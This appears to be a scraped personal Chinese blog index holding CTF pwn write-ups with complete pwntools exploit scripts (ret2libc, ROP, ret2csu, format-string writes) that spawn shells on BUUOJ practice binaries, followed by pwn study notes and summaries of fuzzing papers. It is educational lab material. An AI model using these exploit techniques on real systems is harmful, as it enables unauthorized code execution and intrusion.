print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvuntil(\u0026#39;crash: \u0026#39;)) s_addr = int(p.recv(10), 16) print(hex(s_addr)) print(p.recvline()) print(p.recvline()) payload = b\u0026#39;crashme\\x00\u0026#39; payload = payload.ljust(26, b\u0026#39;a\u0026#39;) payload += p32(s_addr - 0x1c) + shellcode p.sendline(payload) print(p.recvline()) p.interactive() ciscn_2019_c_1 这个题太恶心了，做了好久\n64 位用到 bin/sh 记得 ret 平栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 from pwn import * elf = ELF(\u0026#39;ciscn_2019_c_1\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.27-Ubuntu18-64.so\u0026#39;) # p = process(\u0026#39;ciscn_2019_c_1\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 26942) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] encrypt = elf.symbols[\u0026#39;encrypt\u0026#39;] pop_rdi=0x400c83 ret=0x4006b9 print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) p.sendline(\u0026#39;1\u0026#39;) print(p.recvline()) payload = b\u0026#39;\\x00\u0026#39; + b\u0026#39;a\u0026#39; * (0x50 + 8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(encrypt) p.sendline(payload) print(p.recvline()) print(p.recvline()) puts_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) print(p.recvline()) libc_base = puts_addr - libc.symbols[\u0026#34;puts\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() print(p.recvline()) payload = b\u0026#39;\\x00\u0026#39; + b\u0026#39;a\u0026#39; * (0x50 + 8 - 1) + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.sendline(payload) p.sendline(payload) p.interactive() jarvisoj_level3 这个题太简单，没啥说的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28242) elf = ELF(\u0026#39;level3\u0026#39;) libc = ELF(\u0026#39;libc-2.23-ubuntu16-32.so\u0026#39;) write_plt = elf.plt[\u0026#39;write\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = b\u0026#39;a\u0026#39; * (0x88 + 4) + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4) p.sendline(payload) print(p.recvuntil(\u0026#39;\\n\u0026#39;)) read_addr = u32(p.recv(4)) print(hex(read_addr)) libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x88 + 4) + p32(system_addr) + p32(main) + p32(str_bin_sh) p.sendline(payload) p.interactive() 2023.5.3 HarekazeCTF2019 baby_rop2 这道题学习到了几个点\n64 位记得用寄存器，32 位传参是在栈上 要懂得多试几个，这道题的 printf_got 用不了，那就换成 read 关于接收地址，貌似是 32 位和 64 位不太一样，姑且这么认为吧。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 29445) elf = ELF(\u0026#39;babyrop2\u0026#39;) libc = ELF(\u0026#39;libc.so.6\u0026#39;) printf_plt = elf.plt[\u0026#39;printf\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] format_str = 0x400770 rdi = 0x0400733 rsi=0x400731 payload = b\u0026#39;a\u0026#39; * (0x20 + 8) + p64(rdi) + p64(format_str) + p64(rsi) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main) p.sendline(payload) #32位用这个 # print(p.recvuntil(\u0026#39;\\n\u0026#39;)) # read_addr = u32(p.recv(4)) #64位用这个 read_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(read_addr)) libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) payload = b\u0026#39;a\u0026#39; * (0x20 + 8) + p64(rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.interactive() 2023.5.3 jarvisoj_tell_me_something 这个题有点意思，其实思路就是普通栈溢出 ret2text，但是值得注意的是这个题的栈帧中没有 ebp。 右边是正常函数，左边是这个题的主函数。这个题调整了 rsp 后就直接 ret 了，没有 pop rbp（也就是说 leave 指令不完整） 所以我们在溢出的时候就不要算上 rbp 的 8 个字节了，只覆盖 88 个字节就够了。\n1 2 3 4 5 6 7 8 9 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28091) flag_addr = 0x400620 payload = b\u0026#39;a\u0026#39; * 0x88 + p64(flag_addr) p.sendline(payload) p.interactive() 2023.2.9 JarvisOJ fm ^6d185f\n明显的格式化字符串漏洞，进行一个任意地址内存的覆盖。我们尝试将 x 的值改成 4。 首先来捋一下思路，格式化字符串漏洞的利用总是很绕。\n首先我们想要把 4 写到 addr_of_x，\u0026mdash;-\u0026gt;使用%n，%n 可以将输出的字符个数写入指定的参数指向的地址处 然后我们需要知道第几个参数存储了我们写入的格式字符串\u0026mdash;-\u0026gt;在 gdb 中用 a*n 来找。 那么来构造输入的格式化字符串 0x0804A02C%11$n 前面的是 x 的地址（IDA 看出来的），11 是格式化字符串存储位置（gdb 看出来的） Exp:\n1 2 3 4 5 6 7 8 9 from pwn import * io = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 29563) addr_of_x = 0x0804A02C payload = p32(addr_of_x) + b\u0026#34;%11$n\u0026#34; io.sendline(payload) io.interactive() 注意最后不需要 recv。\n2023.1.31 bjdctf_2020_babystack2 关键点：-1 绕过长度检查 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * #start r = remote(\u0026#34;node4.buuoj.cn\u0026#34;,27324) # r = process(\u0026#34;../buu/bjdctf_2020_babystack2\u0026#34;) elf = ELF(\u0026#34;../buu/bjdctf_2020_babystack2\u0026#34;) #params backdoor_addr = elf.symbols[\u0026#39;backdoor\u0026#39;] #attack r.recv() r.sendline(b\u0026#34;-1\u0026#34;) r.recv() payload = b\u0026#39;M\u0026#39;*(0x10+8) + p64(backdoor_addr) r.sendline(payload) r.interactive() ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E5%88%B7%E9%A2%98/","summary":"picoctf_2018_buffer overflow 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/PicoCTF_2018_buffer_overflow_2\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 28842) # elf win = elf.symbols[\u0026#39;win\u0026#39;] main_addr = elf.symbols[\u0026#39;main\u0026#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x6c","title":"PWN简单题题解"},{"content":"「二进制安全pwn基础」 - 网安\n知识点 [[静态链接栈溢出]] 如何将一个数转化为底层二进制的机器码，最简单的方式就是在IDA中直接看汇编 (80条消息) 堆漏洞挖掘中的bins分类(fastbin、unsorted bin、small bin、large bin)_arena bins_董哥的黑板报的博客-CSDN博客 fastbin 大小在32字节~128字节（0x20~0x80） unsorted bin 对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中 small bin 小于1024字节（0x400）的chunk large bin 大于等于1024字节（0x400）的chunk (80条消息) 堆漏洞挖掘中chunk的实际大小、最低大小、 mchunk_size成员_为什么申请的堆块大小会多加0x10_董哥的黑板报的博客-CSDN博客 当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员 例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间。 shellcode=asm(shellcraft.sh()) (68条消息) 堆中各个重要参数的意义（用于学习入门个人记录）_月阴荒的博客-CSDN博客 64 位记得用寄存器，32 位传参是在栈上 64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样 要懂得多试几个，这道题的 printf_got 用不了，那就换成 read 关于两种 libc 1 2 3 4 5 6 7 8 libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;printf\u0026#39;, printf_addr) # libc_base = printf_addr - libc.dump(\u0026#34;printf\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) 关于接收地址 1 2 3 4 5 6 #32位用这个 print(p.recvuntil(\u0026#39;\\n\u0026#39;)) read_addr = u32(p.recv(4)) #64位用这个 read_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(read_addr)) 对ret栈对齐的解释 Ubuntu18以上系统64位的glibc的payload调用system函数时，所需注意的堆栈平衡问题 - PiCpo的阁楼\n常见的寄存器 sp/esp/rsp（16bit/32bit/64bit）栈寄存器\u0026mdash;指向栈顶 bp/ebp/rbp 栈基址寄存器\u0026mdash;指向栈底 ip/eip/rip 程序指令寄存器\u0026mdash;指向下一条待执行指令 工具 checksec checksec -file=filename checksec工具使用-pwn - 简书 (jianshu.com)\nArch：程序的架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRO：Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。 Stack-canary：栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 **NX：**NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过 PIE：PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。 若开启一般需在攻击时泄露地址信息 RPATH/RUNPATH：程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击 FORTIFY：这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成**read_chk,**fgets_chk, memcpy_chk, printf_chk等。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在。 GDB aslr – 查看 GDB 的 ASLR 设置 checksec – 查看各种安全配置 dumpargs – 显示函数的传参，当在 call 指令处断下时 dumprop – Dump 所有 ROP gadgets 在特定的内存范围 elfheader – 获取 header 的信息 elfsymbol – 获取 non-debugging 的符号信息 lookup – 在指定地址范围内查找地址引用 patch – 在内存开始处 (with string/hexstring/int) Patch pattern – 内存循环模式的操作 procinfo – 在 /proc/pid/ 显示各种信息 pshow – 显示各种 PEDA 操作和其他的设置 pset – 设置各种 PEDA 的操作和其他配置 readelf – 获取 elf 文件 header 信息 ropgadget – 获取 ROP gadgets (二进制或者库) ropsearch – 在内存中查找 ROP gadgets searchmem|find – 寻找内存的 pattern，支持 regex 查找 shellcode – 生成或者下载常见的 shellcodes skeleton – 生成 python 利用漏洞模板 vmmap – 获得 section 的虚拟映射地址范围 xormem – XOR a memory region with a key 通过 key XOR 一个内存域\nX 检查内存，常用。 x/nfu x n, f, 和 u 都是可选参数，用于指定要显示的内存以及如何格式化。 addr 是要开始显示内存的地址的表达式。 n 重复次数（默认值是 1），指定要显示多少个单位（由 u 指定）的内存值。 f 显示格式（初始默认值是 x），显示格式是 print(\u0026lsquo;x\u0026rsquo;，\u0026rsquo;d\u0026rsquo;，\u0026lsquo;u\u0026rsquo;，\u0026lsquo;o\u0026rsquo;，\u0026rsquo;t\u0026rsquo;，\u0026lsquo;a\u0026rsquo;，\u0026lsquo;c\u0026rsquo;，\u0026lsquo;f\u0026rsquo;，\u0026rsquo;s\u0026rsquo;) 使用的格式之一，再加 i（机器指令）。 u 单位大小，b 表示单字节，h 表示双字节，w 表示四字节，g 表示八字节。 disassemble（简写：disas） disas 反汇编指定函数 disas 反汇编某地址所在函数 disas \u0026lt;begin_addr\u0026gt; \u0026lt;end_addr\u0026gt; 反汇编从开始地址到结束地址的部分 backtrace（简写：bt） 栈回溯 bt 打印整个栈的回溯，每个栈帧一行。 bt n 类似于上，但只打印最内层的 n 个栈帧。 bt -n 类似于上，但只打印最外层的 n 个栈帧。 bt full n 类似于 bt n，还打印局部变量的值。 资料 [原创][新手向] 一步一步学pwntools-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E7%BB%86%E7%A2%8E%E7%9F%A5%E8%AF%86/","summary":"「二进制安全pwn基础」 - 网安 知识点 [[静态链接栈溢出]] 如何将一个数转化为底层二进制的机器码，最简单的方式就是在IDA中直接看汇编 (80条","title":"pwn细碎知识"},{"content":"参考：(67条消息) 中级ROP之ret2csu_西杭的博客-CSDN博客\n适用场景 在我们想要调用系统调用，或者在 64 位程序中通过寄存器传递参数，需要设置寄存器中的值，但是有的时候可能没有搜到足够 gadgets 来对寄存器设置值。这个时候需要 csu 函数。\n概述 __libc_csu_init 函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们可以构造栈的分布，然后控制程序跳转到 csu，将寄存器的值设置为所需要的值。\n原理 __libc_csu_init 函数的汇编指令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 .text:00000000004011B0 ; void _libc_csu_init(void) .text:00000000004011B0 public __libc_csu_init .text:00000000004011B0 __libc_csu_init proc near ; DATA XREF: _start+16↑o .text:00000000004011B0 ; __unwind { .text:00000000004011B0 push r15 .text:00000000004011B2 mov r15, rdx .text:00000000004011B5 push r14 .text:00000000004011B7 mov r14, rsi .text:00000000004011BA push r13 .text:00000000004011BC mov r13d, edi .text:00000000004011BF push r12 .text:00000000004011C1 lea r12, __frame_dummy_init_array_entry .text:00000000004011C8 push rbp .text:00000000004011C9 lea rbp, __do_global_dtors_aux_fini_array_entry .text:00000000004011D0 push rbx .text:00000000004011D1 sub rbp, r12 .text:00000000004011D4 sub rsp, 8 .text:00000000004011D8 call _init_proc .text:00000000004011DD sar rbp, 3 .text:00000000004011E1 jz short loc_4011FE .text:00000000004011E3 xor ebx, ebx .text:00000000004011E5 nop dword ptr [rax] .text:00000000004011E8 .text:00000000004011E8 loc_4011E8: ; CODE XREF: __libc_csu_init+4C↓j .text:00000000004011E8 mov rdx, r15 .text:00000000004011EB mov rsi, r14 .text:00000000004011EE mov edi, r13d .text:00000000004011F1 call qword ptr [r12+rbx*8] .text:00000000004011F5 add rbx, 1 .text:00000000004011F9 cmp rbp, rbx .text:00000000004011FC jnz short loc_4011E8 .text:00000000004011FE .text:00000000004011FE loc_4011FE: ; CODE XREF: __libc_csu_init+31↑j .text:00000000004011FE add rsp, 8 .text:0000000000401202 pop rbx .text:0000000000401203 pop rbp .text:0000000000401204 pop r12 .text:0000000000401206 pop r13 .text:0000000000401208 pop r14 .text:000000000040120A pop r15 .text:000000000040120C retn .text:000000000040120C ; } // starts at 4011B0 .text:000000000040120C __libc_csu_init endp 可以看到 csu 函数有三段代码，我们用到的是后面两段。 loc_4011FE 段全是 pop，所以这段代码可以将我们构造的栈中的值全部存入 rbx, rbp, r12, r13, r14, r15寄存器中 loc_4011E8 段会比较复杂一点：\n首先三段 mov 指令将存储在 r15的值赋给 rdx，存储在 r14的值赋给 rsi，存储在 r13的值赋给 edi，此时 rdi 的高32位寄存器中值为0，所以我们也可以控制 rdi 的值。 然后 call 指令跳转到 r12寄存器存储的位置处（在 gadgets1中置 rbx=0） rbx+1，判断是否与 rbp 相等，否则重新执行 gadgets2，这里我们为了不重新执行，将 rbp 置为1 利用方法 我们首先控制程序跳转到 loc_4011FE 段，然后通过末尾的 ret 跳转到 loc_4011E8 段。当程序执行结束 loc_4011E8 后会继续顺序执行 loc_4011FE 端，但是我们已经不需再 pop 了，所以我们在构造栈的时候需要在有用的值后面接着跟上长度一样的 padding 用于第二次的 pop。\n注意这里的 padding 是 56 个字节（我也不知道为啥是 7 个，明明是 6 个寄存器） 在构造栈的时候需要注意的是，rdi 为第一个参数的存放寄存器，rsi 为第二个参数，rdx 为第三个参数。 call 函数为跳转到某地址内所保存的地址，应该使用 got 表中的地址 ret 指令必须跳转到一段有效的汇编指令，所以应为 plt 表中的地址 ciscn_2019_s_3 这个题有两个解法，可以通过 ret2csu，也可以是 srop。这里给出 ret2csu 的解法。 首先我们观察 vuln 函数，用的全是系统调用，没办法 ret2libc，但是我们注意到出题人给了两个 gadgets，一个是 execve 的系统调用号，一个是 sigret。所以我们通过栈溢出来调用 execve 系统调用 调用 execve 系统调用，我们需要设置几个寄存器：\nrax = 0x3b rdi = \u0026amp;\u0026rsquo;/bin/sh\\0' rsi = 0 rdx = 0 差一个 rdx。 所以我们需要用到 csu 函数 ok 现在 gadgets 够用了，只差字符串“bin/sh”的地址了，我们可以写入栈中，然后将栈的地址赋给 rdi。所以接下来我们要尝试暴露栈地址。 我们知道 vuln 函数第一个系统调用是读，第二个是写，那么我们在写之前打个断点，看看写入的值在栈中的位置。 我们可以看到 write 可以写 0x30 个字节，而 buf 距离 rbp 0x16 个字节，并且 vuln 函数栈没有保存上个栈帧的 rbp，所以我们要覆盖 0x10 个字节就够了，那么可以暴露栈上数据 0x20 个字节，我们可以看到除去覆盖字符占去的 16 个字节后在0x7fffffffdeb0 处存了一个栈地址0x7fffffffdfa8，也就是说我们可以将其暴露。0x7fffffffdfa8 距离0x7fffffffde90 的偏移是0x00007fffffffdfa8-0x7fffffffde90=0x118。 那么我们将得到的值减去 0x118 就是我们的目标地址啦。 下面是完整的 exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * elf = ELF(\u0026#34;ciscn_s_3\u0026#34;) p = process(\u0026#34;./ciscn_s_3\u0026#34;) # p = remote(\u0026#34;node4.buuoj.cn\u0026#34;,29348) vuln = elf.symbols[\u0026#39;vuln\u0026#39;] csu_pop = 0x040059A csu_mov = 0x0400580 syscall = 0x400501 execve = 0x004004E2 # mov eax 3Bh ret = 0x400519 pop_rdi_ret = 0x04005A3 #暴露栈中地址 payload = b\u0026#39;a\u0026#39; * 0x10 + p64(vuln) p.sendline(payload) p.recv(0x20) buf = u64(p.recv(0x8)) - 0x118 print(hex(buf)) payload = p64(ret) + b\u0026#39;/bin/sh\\x00\u0026#39; + p64(csu_pop) payload += p64(0) + p64(0) #rbx为0 rbp为1 payload += p64(buf) #call [12] == ret payload += p64(0) * 3 #这里不能将bin/sh的地址直接给r13，因为r13给rdi的低32位，高32位没办法弄，所以要用别的gadget payload += p64(csu_mov) payload += p64(0) * 7 #这里的7个不能理解，明明是pop了6个寄存器呀 payload += p64(execve) payload += p64(pop_rdi_ret) payload += p64(buf + 8) payload += p64(syscall) p.sendline(payload) p.interactive() ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/ret2csu%E4%BB%A5ciscn_2019_s_3%E4%B8%BA%E4%BE%8B%E5%AD%90/","summary":"参考：(67条消息) 中级ROP之ret2csu_西杭的博客-CSDN博客 适用场景 在我们想要调用系统调用，或者在 64 位程序中通过寄存器传递参数，","title":"ret2csu（以ciscn_2019_s_3为例子）"},{"content":"中文译名：revery: 从概念验证到可利用 作者：Yan Wang 单位：IIE 国家： #中国 年份： #2018年 来源： #ccs 关键字： #AGE #fuzzing 代码地址： 笔记建立时间： 2023-05-17 14:32 #TODO\nABSTRACT exploitable states do not always exist in crashing paths existing solutions heavily rely on symbolic execution and not scalable in path exploration and exploit generation few solutions could exploit heap-based vulnerabilities Revery can search exploitable statess in paths divering from crashing paths and generate control-flow hijacking exploits for heap-based vulnerabilities. a layout-contributor digraph 目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/revery-from-proof-of-concept-to-exploitable/","summary":"中文译名：revery: 从概念验证到可利用 作者：Yan Wang 单位：IIE 国家： #中国 年份： #2018年 来源： #ccs 关键字： #AGE #fuzzing 代码地址： 笔记建立时间","title":"Revery from Proof-of-Concept to Exploitable"},{"content":"中文译名：不需要硬件设备和模拟器的语义驱动模糊 作者：Wenjia Zhao 单位：西安交通大学 国家： #中国 年份： #2022年 来源： #NDSS会议 关键字： #fuzzing #仿真托管 代码地址：secsysresearch/DRFuzz (github.com) 笔记建立时间： 2023-03-13 10:24\n摘要 背景：\n驱动接收来自用户空间或硬件的复杂且不可信的输入 驱动代码本身不可靠，开发开发人员经验少，开发结束后难测试 目的：构建不需要设备的驱动 fuzzing 系统 方法：\n通过 semantic-informed 机制可以高效生成可以通过验证链的输入，所以不需要硬件设备了 推断合法的输入值 推断输入字节的时间使用顺序来缩小变异空间 使用错误状态作为反馈来指导 fuzzing 通过验证链 semantic-informed 机制是通用的 可以生成半畸形输入来提高覆盖率 效果：在 214 个 Linux 驱动程序上评估 DR. FUZZ。在 24 小时的时间预算下，DR. FUZZ 可以在没有相应设备的情况下成功初始化和启用大多数驱动程序，而现有的 fuzzer 如 syzkaller 在任何情况下都无法成功。DR. FUZZ 在其他方面也明显优于现有的甚至配备了设备或模拟器的驱动程序模糊器: 它将代码覆盖率提高了 70%，吞吐量提高了 18%。通过 DR. FUZZ，我们还在这些 Linux 驱动程序中发现了 46 个新错误。\n1引言 背景：驱动程序关键且脆弱 现状：当前的驱动 fuzzing 都需要硬件或者模拟器\n硬件难搞 模拟器支持的不多 即使有硬件或者模拟器，但是生成的输入不够畸形，难以触发漏洞 方法：\n关键在于输入要通过验证链，通过验证链就意味着驱动初始化成功 Semantic-informed 机制推断不同的语义信息来有效的生成合法的输入 为了减小过大的输入空间，作者采用一下三种方法 字节级，字段敏感的值推断和映射：字段敏感分析构建 I/O 依赖图，基于图通过字节级的分析推断字段的可能值；并且将字段映射到特定地址的输入字节。 基于时间序列的字节优先的推断：观察到验证链遵循某种时序模型，基于此推断字节的（变异）优先级，每次变异专注于某几个字节，以此来减小变异空间 错误状态作为 fuzzing 反馈：将错误状态反馈和代码覆盖结合来引导模糊器 重用语义通知机制作为半畸形输入生成器，以提高驱动模糊的代码覆盖率和吞吐量。 高覆盖率驱动程序 fuzzer 需要格式良好的输入来到达深度路径，但也需要格式不良的输入来触发宽路径。 2 设备驱动程序的表征研究 A The Linux Kernel Device Model 上图是 LKDM (Linux Kernel Device Model)\n每层都有不同的数据结构来表示设备状态和记录可用的操作（利用函数指针） 这种层次结构极大地简化了设备管理——总线驱动程序定义了设备驱动程序应该实现的接口，内核使用这些接口来管理设备。 设备模型表明，设备是通过一组数据结构和在相应驱动程序中实现的操作来统一组织和管理的。 B The Two-Stage Workflow of Drivers 工作流有两个阶段: 驱动程序初始化和驱动程序与设备之间的通信。 阶段一：结构中心初始化\nKernel 首先通过扫描总线发现设备，根据设备特性匹配相应驱动 总线驱动根据设备输入构建基本设备结构，设备驱动基于此构建更具体的结构 总线驱动调用设备驱动的结构来对设备初始化，分配必要资源 一旦初始化完成，内核就可以通过这些设备结构和驱动程序中相应的操作函数与设备交互。 阶段二：驱动和设备之间的通信\n内核可以通过驱动函数来检查设备状态和与设备通信 大多数设备会提供用户空间的接口，用户程序也可以通过系统调用或者用户空间的接口来操作设备 C Is Device-Free Driver Fuzzing Feasible? – The InputValidation Chains! 想要成功初始化驱动，就要通过验证链。作者依据对验证链的分析，发现了一下几个特点：\n时序输入的使用：对输入字节的验证和使用按时间顺序依次发生，并且每个验证和使用都只针对一个或几个字节，而不是全部字节——fuzzing 不需要变异整个字节，而可能是一个字节一个字节地变异，这将极大地减少变异空间。 硬编码的 I/O 地址-值映射：总线和驱动从设备读入地址和数据大小来初始化设备对应的数据结构。地址和数据大小是硬编码写在驱动中的常数，恢复这些常数会帮助作者构建设备的特定偏移量的输入和它们在驱动程序代码中的引用之间的映射。（我理解为传染总线驱动的代码地址和设备驱动中的代码之间的映射） 普遍的错误处理：依据驱动返回的错误状态来推断 fuzzer 生成的输入中的字节值是否正确。 其他发现：在初始化中驱动会采用 MMIO 或 DMA 的方式来访问设备 I/O 地址空间。 3 DR. FUZZ 的 overview A 技术挑战 DR. FUZZ 的核心是利用 fuzzing 生成正确的输入来构建正确的设备相关结构。正确的输入意味着内核需要知道 (1) 从哪个地址读取，(2) 应该读取什么值。\n挑战 1：极其复杂的数据结构导致输入空间大 挑战 2：复杂多样的 I/O 寻址 B 解决方法概述 挑战 1：尽量减少相关数据结构的数量，以及它们字段的可能值的范围。 通过精确的静态分析来构建依赖于 I/O 的图来识别驱动程序中与设备相关的数据结构以及这些数据结构中与 I/O 相关的字段。 然后提取这些字段，保留感兴趣的字段 通过字节级和字段敏感的分析来确定字段的验证链 通过分析验证链，使用字段敏感分析从分支语句中收集约束 (即依赖值)，这有助于确定字段的候选值集。 基于验证链遵循时序的特点，作者提出字节优先（时序）推断，以确定哪些字段的哪些字节应当首先构造，这可以显著减少输入突变空间。 挑战 2：在获得候选值和字节优先级信息之后，我们还需要将此信息与设备的特定 I/O 地址相关联，以便我们可以在正确的地址处准备值。 首先识别 I/O 地址在驱动程序代码中硬编码的字段（咋识别？），将这些字段映射到 I/O 端口/MMIO 语句的常数参数，这就构成了 I/O 地址-值映射。（这个映射时用来指明上面生成的值放到哪个 I/O 地址） 对于没有硬编码映射的情况，采用动态映射分析。 C 框架和组件 分为两个部分：\nSemantic-iniformed 机制：该部分静态地收集语义信息，指示驱动程序代码，在运行时获得反馈，并改变当前输入 驱动模糊框架：它管理 VM 的运行，并通过设备适配器将 fuzzer 输出注入 VM 内核，在这个框架中，最重要和最独特的设计是 I/O 拦截和数据注入。它首先拦截目标设备 I/O 访问，然后将地址和大小转发给 fuzzer。然后，该框架使用 fuzzer 输出作为设备输入，将数据注入 QEMU 虚拟内存区域。 语义分析 提取多种有用的语义信息并生成语义库（图中 1b），语义库包含了推断的值。 在驱动代码插桩捕捉错误状态（1a） Fuzzer 管理 VM 快照——用于每次变异后的运行 生成输入数据 接受错误状态进行变异 设备适配器 由于不同总线上的设备地址不同，设备适配器负责将给定的假设备地址“附加”到适当的总线上。hypervisor 将 I/O 端口/MMIO/DMA 